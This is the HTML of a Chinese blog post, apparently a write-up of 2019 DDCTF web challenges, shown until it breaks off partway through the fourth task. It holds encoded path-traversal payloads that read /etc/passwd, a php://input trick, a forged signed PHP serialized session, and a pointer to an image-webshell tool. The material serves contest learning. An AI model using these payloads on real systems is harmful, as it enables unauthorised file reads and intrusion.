@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+   
+    <meta name="keywords" content="ddctf,writeup" />
+  
+  
+  
+  
+  <title>2019DDCTF  writeup | 丶诺熙丨5am3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="本文首发先知社区，文章链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4862  最近打了打DDCTF，本来是无聊打算水一波。最后竟然做high了，硬肛了几天..以下为本次比赛web题目的WriteUp:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019DDCTF  writeup">
+<meta property="og:url" content="https://blog.5am3.com/2019/04/19/ddctf2019/index.html">
+<meta property="og:site_name" content="丶诺熙丨5am3">
+<meta property="og:description" content="本文首发先知社区，文章链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4862  最近打了打DDCTF，本来是无聊打算水一波。最后竟然做high了，硬肛了几天..以下为本次比赛web题目的WriteUp:">
+<meta property="og:locale">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50947ba0-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50be2e82-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50cac2c8-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50e49324-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-51054d8a-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5124034c-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-513f8f40-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5154291e-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-516d3512-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-517bafde-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51b2449a-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51cdaece-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-521160ec-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-524a5c1c-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-525bbc82-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-527b68b6-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-528ee7b0-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-52b1bf06-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52d17ca6-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52ee491c-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-53004d92-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-5323353c-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-535036fe-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-536aa9bc-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-537ca694-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53a0ab20-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53c23aec-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53d3ce10-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-54038c18-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-5412aa40-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-544327ec-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-545ac654-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54b3473e-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54f65eac-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-5527d2de-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-5555b226-6202-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-556bf6f8-6202-1.png">
+<meta property="article:published_time" content="2019-04-19T03:04:00.000Z">
+<meta property="article:modified_time" content="2024-12-05T02:39:41.684Z">
+<meta property="article:author" content="丶诺熙">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50947ba0-6202-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="丶诺熙丨5am3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+        <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
+        <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+        <!-- <script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script> -->
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder=" Search...">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/">主页</a></li>
+                        
+                            <li><a  href="/archives/">归档</a></li>
+                        
+                            <li><a  href="/tags">标签</a></li>
+                        
+                            <li><a  href="/categories/">分类</a></li>
+                        
+                            <li><a  href="/about/">关于</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/5am3" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                                <a class="fl mail"  target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
+                            
+                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/0ctf/" style="font-size: 10px;">0ctf</a> <a href="/tags/HEXO/" style="font-size: 12.5px;">HEXO</a> <a href="/tags/csp/" style="font-size: 10px;">csp</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/misc/" style="font-size: 12.5px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/nonce%E7%BB%95%E8%BF%87/" style="font-size: 10px;">nonce绕过</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 10px;">web渗透</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/writeup-web-xss/" style="font-size: 10px;">writeup - web - xss</a> <a href="/tags/xman/" style="font-size: 12.5px;">xman</a> <a href="/tags/xss/" style="font-size: 17.5px;">xss</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个热爱安全的小渣渣！</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                    <li><a href="/categories/">分类</a></li>
+                
+                    <li><a href="/about/">关于</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/5am3" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                        <a class="mail" target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-ddctf2019" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/04/19/ddctf2019/" class="article-date">
+      <time datetime="2019-04-19T03:04:00.000Z" itemprop="datePublished">2019-04-19</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019DDCTF  writeup
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/writeup/">writeup</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>本文首发先知社区，文章链接：<a href="https://xz.aliyun.com/t/4862">https://xz.aliyun.com/t/4862</a></p>
+</blockquote>
+<p>最近打了打DDCTF，本来是无聊打算水一波。最后竟然做high了，硬肛了几天..<br>以下为本次比赛web题目的WriteUp:</p>
+<span id="more"></span>
+
+<h3 id="100pt-滴"><a href="#100pt-滴" class="headerlink" title="[100pt] 滴~"></a>[100pt] 滴~</h3><p>看到url疑似base64，尝试解密后发现加密规则如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b64(b64(ascii2hex(filename)))</span><br></pre></td></tr></table></figure>
+
+<p>于是可以自己构造，使其实现任意文件读取，首先先尝试&#x2F;etc&#x2F;passwd。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[plain] -&gt; ../../../../../../../etc/passwd</span><br><span class="line">[0] HEX -&gt; 2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F6574632F706173737764</span><br><span class="line">[1] base64 -&gt; MkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGNjU3NDYzMkY3MDYxNzM3Mzc3NjQ=</span><br><span class="line">[2] base64 -&gt; TWtVeVJUSkdNa1V5UlRKR01rVXlSVEpHTWtVeVJUSkdNa1V5UlRKR01rVXlSVEpHTWtVeVJUSkdOalUzTkRZek1rWTNNRFl4TnpNM016YzNOalE9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50947ba0-6202-1.png"></p>
+<p>发现斜杠被过滤掉了。此时尝试读一下index.php源码。来看一下规则。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[plain] -&gt; index.php</span><br><span class="line">[2] base64 -&gt; TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure>
+
+<p>最终获取到源码如下。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50be2e82-6202-1.png"></p>
+<p>在这里，可以看到对对文件读取做了限制，想绕正则，是不存在的。此时打开预留hint看看，猜测可能是echo的问题？试了许久，还是放弃了。</p>
+<p>过了几天，默默打开CSDN评论，还是看到一点有意思的东西的。最终发现出题人故意将hint放在practice.txt.swp</p>
+<p>emm，贼迷的一题。然后提示flag!ddctf.php</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50cac2c8-6202-1.png" alt="20190418155555180974149.png"></p>
+<p>读源码，此时用config替代！号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/D/D/web-di~ $ python a.py f1agconfigddctf.php</span><br><span class="line">[0] HEX -&gt; 66316167636F6E66696764646374662E706870</span><br><span class="line">[1] base64 -&gt;NjYzMTYxNjc2MzZGNkU2NjY5Njc2NDY0NjM3NDY2MkU3MDY4NzA=</span><br><span class="line">[2] base64 -&gt;TmpZek1UWXhOamMyTXpaR05rVTJOalk1TmpjMk5EWTBOak0zTkRZMk1rVTNNRFk0TnpBPQ==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50e49324-6202-1.png" alt="20190418155555207812339.png"></p>
+<p>然后直接构造就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://117.51.150.246/f1ag!ddctf.php</span><br><span class="line">get: ?uid=123&amp;k=php://input</span><br><span class="line">post: 123</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-51054d8a-6202-1.png" alt="20190418155555220658207.png"></p>
+<h3 id="130pt-签到题"><a href="#130pt-签到题" class="headerlink" title="[130pt] 签到题"></a>[130pt] 签到题</h3><p>很简单的一个代码审计题目。一开始有点脑洞，需要绕一下认证，不过也不难。</p>
+<p>访问页面，会有一个登陆认证，此时分析流量数据，可以发现他向auth.php请求了一下，返回值刚好是没权限。也就是权限验证在这里，分析数据包，可以发现，请求头有一个username字段。尝试修改为admin，此时成功通过认证。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5124034c-6202-1.png" alt="image.png"></p>
+<p>然后返回了一个源码页面。此时进入分析源码阶段。源码不是太多，核心逻辑也很好懂，包括利用链的构造。</p>
+<p>首先，分析源码，可以看到危险函数unserialize，以及file_get_contents。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-513f8f40-6202-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5154291e-6202-1.png" alt="image.png"></p>
+<p>此时可以大概知道题目大体解题流程如下：</p>
+<p>通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg</p>
+<p>此时一步一步来。</p>
+<p>分析代码，可以发现session这个变量，是由cookie传入的。此时经过签名校验，确定cookie不可更改。代码如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-516d3512-6202-1.png" alt="image.png"></p>
+<p>此时可以看到，签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点</p>
+<p>a) eancrykey存放目录为..&#x2F;config&#x2F;key.txt。</p>
+<p>由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。</p>
+<p>b) 某处代码存在蜜汁调用。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-517bafde-6202-1.png" alt="image.png"></p>
+<p>很明显，可以看出是主办方给的后门，但是怎么用呢？</p>
+<p>sprintf函数，是格式化字符串用的函数。可以参考c语言的printf，只不过这里不会打印，而是返回格式化后的字符串。</p>
+<p>此时可以分析一下逻辑。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 伪代码</span></span><br><span class="line"><span class="comment"># 别尝试执行，肯定执行不了</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;Welcome my friend %s&quot;</span></span><br><span class="line">arr=[<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">  data=sprintf(data,i)</span><br><span class="line">  <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出如下：</span></span><br><span class="line"><span class="comment"># Welcome my friend eval</span></span><br><span class="line"><span class="comment"># Welcome my friend eval</span></span><br></pre></td></tr></table></figure>
+<p>此时问题来了，为什么会输出两次？因为在第一次格式化的时候，已经将eval填入data中，第二次格式化前的字符串为：Welcome my friend eval。此时没有%s占位，key也就无处可去了。</p>
+<p>所以，此时我们将eval改成%s，遍可以成功打印出key。机智！</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51b2449a-6202-1.png" alt="20190416155534646782674.png"></p>
+<p>此时成功getkey。然后就可以愉快地伪造session了。</p>
+<p>然后继续分析Application，我们该如何伪造session。此时，建议down下来Application.php，方便调试使用。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51cdaece-6202-1.png" alt="image.png"></p>
+<p>可以发现，代码中做了两层防护，来保证path的安全性。此时sanitizepath可以通过一个最经典的绕过—“双写” 来进行绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: ../</span><br><span class="line">双写后: ..././</span><br></pre></td></tr></table></figure>
+<p>此时可以看出，在经过这个函数后，第二三四个字符将会被转为空。然后成功使..&#x2F;逃逸出来。</p>
+<p>再看第二个限制了字符为18。此时我们可以通过..&#x2F;和.&#x2F;来进行绕过，不过，唯一缺点是，字符不能超过18个。</p>
+<p>此时尝试读取&#x2F;etc&#x2F;passwd。计算其长度，为10。此时我们可以构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/../etc/passwd</span><br><span class="line">双写后:/etc/..././etc/passwd</span><br><span class="line">序列化后:O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;/etc/..././etc/passwd&quot;;&#125;</span><br><span class="line">按规则签名后:O%3a11%3a&quot;Application&quot;%3a1%3a&#123;s%3a4%3a&quot;path&quot;%3bs%3a21%3a&quot;/etc/..././etc/passwd&quot;%3b&#125;75c51ff78b04d77138ca58f797dedc0a;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-521160ec-6202-1.png" alt="20190418155552854552309.png"></p>
+<p>此时可以看到成功读取了&#x2F;etc&#x2F;passwd。</p>
+<p>最终在 ..&#x2F;config&#x2F;flag.txt读到flag，如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-524a5c1c-6202-1.png" alt="20190418155552881549035.png"></p>
+<p>  </p>
+<h3 id="130pt-Upload-IMG"><a href="#130pt-Upload-IMG" class="headerlink" title="[130pt] Upload-IMG"></a>[130pt] Upload-IMG</h3><p>比较经典的一个题目了，绕过GD库，实现图片马。一般来说，搭配一个文件包含，简直是无敌的。在这里不多解释，直接上脚本了。</p>
+<p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p>
+<blockquote>
+<p>Usage: php jpg_payload.php &lt;jpg_name.jpg&gt;</p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-525bbc82-6202-1.png" alt="20190418155552900631607.png"></p>
+<h3 id="140pt-homebrew-event-loop"><a href="#140pt-homebrew-event-loop" class="headerlink" title="[140pt] homebrew event loop"></a>[140pt] homebrew event loop</h3><p>这题给好评，思路超级棒！</p>
+<p>先说一下题目：开局给你3块钱，让你买5个一元一个的钻石。从而得到flag。</p>
+<p>上来可以拿到源码，首先分析源码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag获取函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FLAG</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下三个函数负责对参数进行解析。</span></span><br><span class="line"><span class="comment"># 1. 添加log，并将参数加入队列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_event</span>(<span class="params">event</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 工具函数，获取prefix与postfix之间的值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_event_loop</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站入口点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">entry_point</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 页面渲染，三个页面:index/shop/reset</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_handler</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>(<span class="params">args</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加钻石</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_handler</span>(<span class="params">args</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算价钱，进行减钱</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_point_function</span>(<span class="params">args</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_flag_function</span>(<span class="params">args</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_handler</span>(<span class="params">args</span>)</span><br></pre></td></tr></table></figure>
+
+<p>源码大概意思如上，可以看出大概流程。然后仔细分析，可以发现在购买逻辑中。先调用增加钻石，再调用计算价钱的。也就是先货后款。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-527b68b6-6202-1.png" alt="20190413155516130320917.png"></p>
+<p>现实生活中，肯定没毛病，但是在计算机中，会不会出现先给了货后，无法扣款，然后货被拿跑了。此时继续往下看，发现consume_point_function函数中，当钱不够时，会抛出一个RollBackException。此时，在逻辑处理函数execute_event_loop中，会捕获这个异常，并将现有状态置为上一session状态。如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-528ee7b0-6202-1.png" alt="image.png"></p>
+<p>此时，天真的我，想起了条件竞争，如果我够快的话，会不会让他加几个钻石，重置session时，重置到已经加完的。</p>
+<p>但此时，仔细分析代码，以及flask的特性，你会发现一件事，他的状态并非是基于服务端session，而是客户端session，此时不应该叫他session了，叫cookie更合适一点。也就是，所有的状态都存在客户端。你竞争的话，他的session是单线程的。我必须操作完上一状态，才可以操作下一状态。</p>
+<p>此时，条件竞争凉凉。</p>
+<p>那既然状态是在客户端，那我可不可以修改？答案是可以。但是你得需要知道flask的secret_key。然后从而伪造cookie，此时我们无法伪造。思路继续断掉。继续分析代码。</p>
+<p>仔细分析execute_event_loop，会发现里面有一个eval函数。无论在什么语言中，eval可控， 必定是一个灾难。</p>
